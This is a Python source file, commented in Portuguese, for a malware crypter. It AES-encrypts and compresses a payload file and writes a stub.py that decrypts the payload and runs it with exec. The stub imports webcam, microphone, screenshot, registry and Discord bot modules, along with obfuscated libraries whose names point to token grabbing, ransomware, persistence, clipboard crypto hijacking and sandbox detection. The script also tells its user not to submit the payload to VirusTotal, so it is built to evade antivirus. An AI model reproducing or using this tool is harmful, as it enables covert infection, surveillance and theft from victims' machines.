import os
import time
import zlib
import base64
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

# Função para criptografar dados usando AES
def enc_data(data, key, iv):
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return base64.b64encode(encrypted_data).decode('utf-8')

# Função para descriptografar dados usando AES
def dec_data(encrypted_data, key, iv):
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    decryptor = cipher.decryptor()
    encrypted_data = base64.b64decode(encrypted_data)
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(decrypted_data) + unpadder.finalize()
    return data

# Função principal para ofuscar o payload
def obf_payload():
    print("\n[*] Enter Path Of Payload File: ", end="")
    payload_path = input().strip()
    
    with open(payload_path, "r", encoding="utf-8") as file:
        payload_data = file.read()

    print("\n[*] File Obfuscation Started!")
    time.sleep(random.uniform(0.5, 1.5))

    # Comprime e criptografa o payload
    compressed_data = zlib.compress(payload_data.encode('utf-8'))
    key = os.urandom(32)  # 256-bit key
    iv = os.urandom(16)   # 128-bit IV
    encrypted_data = enc_data(compressed_data, key, iv)

    # Criptografa a chave e o IV com outra chave AES
    aes_key = os.urandom(32)
    aes_iv = os.urandom(16)  # IV for encrypting the key and IV
    encrypted_key = enc_data(key, aes_key, aes_iv)
    encrypted_iv = enc_data(iv, aes_key, aes_iv)
    encrypted_aes_key = base64.b64encode(aes_key).decode('utf-8')
    encrypted_aes_iv = base64.b64encode(aes_iv).decode('utf-8')

    print("\n[*] Do Not Submit Payload on VirusTotal!")
    time.sleep(random.uniform(1.5, 3.0))

    # Gera o stub (código que descriptografa e executa o payload)
    with open('stub.py', 'w', encoding="utf-8") as f:
        f.write(f"""
import discord
from discord.ext import commands
from discord import app_commands
import os
import subprocess as sp
import requests
import random
from cv2 import VideoCapture
from cv2 import imwrite
from scipy.io.wavfile import write
from sounddevice import rec, wait
import platform
import re
from urllib.request import Request, urlopen
import pyautogui
from datetime import datetime
import shutil
import sys
from multiprocessing import Process
import threading
import json
import ctypes
from ctypes.wintypes import HKEY
import time
from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
import win32api
import asyncio
import win32process
import psutil
import win32pdh
from winreg import *
from ctypes import *
from libraries import c0kix, ctrv, d11sc00rdgrrr4b as gr333bd111scord_lib, d33lf1le as d33llfile_lib, h4rd4rel1st as h444rd2arel1lst, ist4rtf1l as st44rtf1l3, wpiccg4m3s, layn, t4l3g, uebi, v3tudo, vmsai, xistori, u44l3t, isc0nd3file
from libraries.r4s000u4ere import bts, d1r3ct03232ry3cnrypt, e333ncryp443344d1322ves
from libraries.p333s1st3nt import blocksites, n3v3rp4r4, st44rt4trup
from libraries.r3cov333r1 import r3c00v, r3c0ff, n0r33g1, y3sr3g, n0cdm, y3scdm, n0t4sk, y3st4sk
from libraries.cl222p34crypto import s44t4r4tc1lp3r, st0pcl111p
from libraries import layn
import logging 
import base64
import zlib
from libraries import layn
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend


def dec_data(enc_data, k, i):
    backend = default_backend()
    cipher = Cipher(algorithms.AES(k), modes.CBC(i), backend=backend)
    decryptor = cipher.decryptor()
    enc_data = base64.b64decode(enc_data)
    decrypted_data = decryptor.update(enc_data) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(decrypted_data) + unpadder.finalize()
    return data

encrypted_data = "{encrypted_data}"
encrypted_key = "{encrypted_key}"
encrypted_iv = "{encrypted_iv}"
aes_key = base64.b64decode("{encrypted_aes_key}")
aes_iv = base64.b64decode("{encrypted_aes_iv}")

key = dec_data(encrypted_key, aes_key, aes_iv)
iv = dec_data(encrypted_iv, aes_key, aes_iv)

decrypted_data = dec_data(encrypted_data, key, iv)
decompressed_data = zlib.decompress(decrypted_data)
exec(decompressed_data.decode('utf-8'))
        """)
    print("\n[*] File Obfuscation Success!")


def main():
    obf_payload()

if __name__ == "__main__":
    main()